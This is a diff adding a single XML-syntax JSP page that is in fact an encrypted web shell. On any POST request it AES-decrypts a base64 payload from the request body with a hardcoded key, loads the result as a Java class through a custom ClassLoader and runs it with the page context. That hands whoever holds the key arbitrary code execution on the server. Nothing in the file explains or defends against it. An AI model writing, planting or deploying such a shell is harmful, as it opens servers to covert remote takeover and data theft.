@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+  <jsp:directive.page
+      import="java.util.*,javax.crypto.*,javax.crypto.spec.*"
+      contentType="text/html;charset=UTF-8"/>
+  <jsp:declaration><![CDATA[
+    class U extends ClassLoader {
+      U(ClassLoader c) { super(c); }
+      public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
+    }
+  ]]></jsp:declaration>
+  <jsp:scriptlet><![CDATA[
+    if (request.getMethod().equals("POST")) {
+      String k = "42b842fc69195c9d";
+      session.putValue("u", k);
+      Cipher c = Cipher.getInstance("AES");
+      c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+      new U(this.getClass().getClassLoader())
+          .g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine())))
+          .newInstance()
+          .equals(pageContext);
+    }
+  ]]></jsp:scriptlet>
+</jsp:root>
